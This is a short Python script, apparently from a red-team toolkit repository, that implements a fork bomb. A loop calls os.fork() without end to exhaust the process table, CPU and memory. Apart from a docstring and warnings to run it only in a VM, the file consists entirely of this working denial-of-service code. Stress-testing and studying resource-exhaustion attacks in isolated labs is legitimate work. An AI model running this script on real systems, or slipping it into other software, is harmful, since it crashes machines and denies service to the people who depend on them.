#!/usr/bin/env python3
"""
Fork Bomb in Python
-------------------
A fork bomb is a denial-of-service attack where a process replicates itself indefinitely,
exhausting system resources (CPU, memory, process table).

WARNING: Running this will crash your system. Only test in isolated environments (e.g., VMs).

Author: Aryan Giri
Repo: https://github.com/giriaryan694-a11y/RedTeamCrashKit
"""

import os

def fork_bomb():
    while True:
        try:
            # Fork a new process
            pid = os.fork()
            if pid == 0:
                # Child process: keep forking
                continue
            else:
                # Parent process: exit to avoid zombie processes
                os._exit(0)
        except OSError:
            # Process table full or resource exhausted
            print("Fork failed. System may be unstable.")
            break

if __name__ == "__main__":
    print("WARNING: This will crash your system. Run only in a VM or container.")
    print("Repo: https://github.com/giriaryan694-a11y/RedTeamCrashKit")
    fork_bomb()
